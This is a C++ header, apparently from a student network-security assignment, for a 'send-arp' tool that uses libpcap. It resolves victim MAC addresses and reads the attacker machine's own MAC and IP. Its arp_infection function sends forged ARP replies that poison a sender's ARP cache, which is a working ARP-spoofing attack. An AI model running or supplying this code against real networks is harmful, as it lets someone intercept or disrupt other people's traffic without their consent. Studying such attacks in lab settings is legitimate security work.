#pragma once
#include <cstdio>
#include <cstring>
#include <cstdlib>
#include <string>
#include <fcntl.h>
#include <unistd.h>
#include <pcap.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>

#include "ethhdr.h"
#include "arphdr.h"

#define ETHER_HDR_LEN 14

#define MAC_LEN 17
#define IP_LEN 15

#define ARP_REQ 0
#define ARP_REP 1

#define TARGET 0
#define SENDER 1

#pragma pack(push, 1)
struct EthArpPacket final
{
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage()
{
    printf("send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sudo ./send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void send_arp(pcap_t *handle, const char *dmac, const char *smac, const char *sip, const char *tmac, const char *tip, int mode)
{
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(dmac);
    packet.eth_.smac_ = Mac(smac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;

    if (mode == ARP_REQ)
        packet.arp_.op_ = htons(ArpHdr::Request);
    else if (mode == ARP_REP)
        packet.arp_.op_ = htons(ArpHdr::Reply);

    packet.arp_.smac_ = Mac(smac);
    packet.arp_.sip_ = htonl(Ip(sip));
    packet.arp_.tmac_ = Mac(tmac);
    packet.arp_.tip_ = htonl(Ip(tip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(-1);
    }
}

void arp_infection(pcap_t *handle, const char *s_mac, const char *s_ip, const char *t_ip, const char *a_mac)
{
    for (int i = 0; i < 5; i++) //just in case
        send_arp(handle, s_mac, a_mac, t_ip, s_mac, s_ip, ARP_REP);
}

char *get_target_mac(uint8_t *mac)
{
    static __thread char buf[MAC_LEN + 1] = {0};
    snprintf(buf, sizeof(buf),
             "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return buf;
}
char *get_sender_mac(uint8_t *mac)
{
    static __thread char buf[MAC_LEN + 1] = {0};
    snprintf(buf, sizeof(buf),
             "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return buf;
}
char *get_mac_by_arp(pcap_t *handle, const char *a_mac, const char *a_ip, const char *t_ip, int mode)
{
    struct pcap_pkthdr *header;
    const u_char *packet;

    send_arp(handle, "ff:ff:ff:ff:ff:ff", a_mac, a_ip, "00:00:00:00:00:00", t_ip, ARP_REQ); //send arp req to target

    struct ArpHdr arp;

    while (true)
    {
        int res = pcap_next_ex(handle, &header, &packet);

        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        if (packet != NULL)
        {
            memcpy(&arp, packet + ETHER_HDR_LEN, sizeof(arp));
            struct Ip chk_a_ip(a_ip);
            struct Mac chk_a_mac(a_mac);
            struct Ip chk_t_ip(t_ip);
            if (chk_a_ip == arp.tip() && chk_t_ip == arp.sip() && chk_a_mac == arp.tmac())
                break;
        }
    }

    Mac src_mac = arp.smac();
    uint8_t *smac = reinterpret_cast<uint8_t *>(&src_mac);

    if (mode == TARGET)
        return get_target_mac(smac);
    else
        return get_sender_mac(smac);
}

char *get_attacker_mac(const char *dev)
{
    static __thread char buf[MAC_LEN + 1] = {0};

    int len = strlen(dev);
    int sz = len + 24; //NULL considerd
    char *path = (char *)malloc(sz);
    if (path == NULL)
    {
        perror("path malloc failed");
        exit(-1);
    }

    snprintf(path, sz, "%s%s%s", "/sys/class/net/", dev, "/address");
    int fd = open(path, O_RDONLY);
    if (fd == -1)
    {
        perror("open failed");
        exit(-1);
    }

    int bytes = read(fd, buf, MAC_LEN);
    if (bytes != MAC_LEN)
    {
        fprintf(stderr, "mac addr read failed");
        free(path);
        close(fd);
    }

    free(path);
    close(fd);
    return buf;
}

char *get_attacker_ip(const char *dev)
{
    struct ifreq ifr;
    static __thread char ip[IP_LEN + 1] = {0};

    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s == -1)
    {
        perror("socket creation failed");
        exit(-1);
    }
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0)
    {
        perror("ioctl error");
        close(s);
        exit(-1);
    }
    else
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data + sizeof(u_short), ip, sizeof(struct sockaddr));

    close(s);
    return ip;
}

void show_info(const char *s_ip, const char *s_mac, const char *t_ip, const char *t_mac, const char *a_ip, const char *a_mac)
{
    puts("====Sender====");
    printf("IP : %s\n", s_ip);
    printf("MAC : %s\n", s_mac);
    puts("====Target====");
    printf("IP : %s\n", t_ip);
    printf("MAC : %s\n", t_mac);
    puts("====Attacker====");
    printf("IP : %s\n", a_ip);
    printf("MAC : %s\n", a_mac);
}